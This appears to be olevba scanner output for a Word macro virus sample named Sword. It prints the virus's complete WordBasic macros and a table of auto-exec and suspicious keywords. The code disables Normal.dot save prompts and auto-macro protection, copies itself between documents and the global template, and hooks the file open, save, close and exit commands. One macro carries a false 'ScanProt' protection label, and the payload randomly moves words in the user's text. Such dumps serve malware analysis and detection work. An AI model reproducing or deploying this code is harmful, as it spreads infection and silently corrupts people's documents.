olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sword-23639def32e1282846fe950832b43f08ebb1fd85
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sword-23639def32e1282846fe950832b43f08ebb1fd85 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Sword-23639def32e1282846fe950832b43f08ebb1fd85 - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.autoOpen.MAIN"
    On Error GoTo -1: On Error GoTo errCt
        
    WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
    WordBasic.DisableAutoMacros 0
    SaveMacros "autoOpen"
    SaveMacros "FileClose"
    SaveMacros "AutoExec"
    SaveMacros "FileExit"
    SaveMacros "FileSave"
    SaveMacros "FileOpen"

    PayDay

GoTo bye
errCt:

bye:
    On Error GoTo -1: On Error GoTo 0

End Sub

Private Sub PayDay()
Dim sword$

        If Rnd() < 0.1 Then
            RndWord
            WordBasic.SelectCurWord
            sword$ = WordBasic.[Selection$]()
            WordBasic.DeleteWord

            RndWord
            WordBasic.Insert sword$ + " "
        End If

End Sub

Private Sub RndWord()
Dim wordNum
    WordBasic.FileSummaryInfo Update:=1
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.DocumentStatistics(False)
    WordBasic.CurValues.DocumentStatistics dlg

    wordNum = WordBasic.Int(Rnd() * WordBasic.Val(dlg.Words))
    WordBasic.StartOfDocument
    WordBasic.WordRight wordNum
End Sub

Private Sub SaveMacros(M$)
Dim fileMacro$
Dim globMacro$
Dim MacroFile$
    WordBasic.FileSummaryInfo Update:=1
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
    WordBasic.CurValues.FileSummaryInfo dlg

    fileMacro$ = dlg.Directory + "\" + dlg.FileName + ":" + M$
    globMacro$ = "Global:" + M$
    MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If MacroFile$ = "NORMAL.DOT" Then
        WordBasic.MacroCopy globMacro$, fileMacro$
        WordBasic.FileSaveAs Format:=1
    Else
        WordBasic.MacroCopy fileMacro$, globMacro$
    End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: Virus.MSWord.Sword-23639def32e1282846fe950832b43f08ebb1fd85 - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Closes all of the windows of the active document"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
    On Error Resume Next
    WordBasic.Call "autoOpen"
    WordBasic.FileClose
    On Error GoTo -1: On Error GoTo 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Sword-23639def32e1282846fe950832b43f08ebb1fd85 - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    Rem DisableAutoMacros
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileExit.bas 
in file: Virus.MSWord.Sword-23639def32e1282846fe950832b43f08ebb1fd85 - OLE stream: 'Macros/VBA/FileExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Quits Microsoft Word and prompts to save the documents"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileExit.MAIN"
Dim Save
    On Error Resume Next
    WordBasic.Call "AutoOpen"
    WordBasic.FileExit Save
    On Error GoTo -1: On Error GoTo 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Sword-23639def32e1282846fe950832b43f08ebb1fd85 - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
    On Error Resume Next
    WordBasic.Call "autoOpen"
    WordBasic.FileSave
    On Error GoTo -1: On Error GoTo 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Sword-23639def32e1282846fe950832b43f08ebb1fd85 - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Opens an existing document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
    WordBasic.Call "autoOpen"
    On Error GoTo -1: On Error GoTo cancelled
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
    WordBasic.CurValues.FileOpen dlg
    WordBasic.Dialog.FileOpen dlg
    WordBasic.FileOpen dlg
cancelled:
On Error GoTo -1: On Error GoTo 0
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

